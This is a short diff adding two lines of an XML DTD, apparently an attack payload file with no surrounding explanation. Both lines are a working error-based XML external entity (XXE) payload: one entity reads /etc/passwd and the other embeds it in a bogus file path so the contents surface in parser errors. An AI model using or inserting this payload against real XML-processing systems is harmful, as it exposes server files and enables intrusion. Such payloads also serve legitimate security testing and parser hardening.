@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
